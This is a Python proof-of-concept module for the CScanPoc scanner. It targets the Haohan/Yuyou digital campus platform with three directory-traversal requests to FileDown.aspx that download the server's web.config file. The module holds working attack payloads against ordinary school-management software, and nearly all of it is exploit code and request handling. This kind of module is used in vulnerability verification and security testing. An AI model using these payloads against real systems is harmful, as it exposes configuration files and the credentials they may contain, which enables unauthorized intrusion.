# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Haohan_0002'  # 平台漏洞编号，留空
    name = '育友数字化校园平台通用型3处任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2015-06-24'  # 漏洞公布时间
    desc = '''
        皓翰数字化校园平台是由浙江皓翰教育科技有限公司推出的一款校园管理软件。
        皓翰数字化校园平台通用型3处任意文件下载。
        '/IneduPortal/Components/news/FileDown.aspx?OldName=web.config&NewName=../web.config',
        '/Inedu3In1/Components/news/FileDown.aspx?OldName=web.config&NewName=../../../web.config',
        '/IneduBlog/Components/news/FileDown.aspx?OldName=web.config&NewName=../../../web.config'
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0103034'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '育友数字化校园平台'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '266e2bde-041f-4f50-a441-1be8728efb0c'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payloads = [
                '/IneduPortal/Components/news/FileDown.aspx?OldName=web.config&NewName=../web.config',
                '/Inedu3In1/Components/news/FileDown.aspx?OldName=web.config&NewName=../../../web.config',
                '/IneduBlog/Components/news/FileDown.aspx?OldName=web.config&NewName=../../../web.config']
            for payload in payloads:
                target = arg + payload
                code, head, res, errcode, _ = hh.http(target)

                if code == 200 and '</configuration>' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
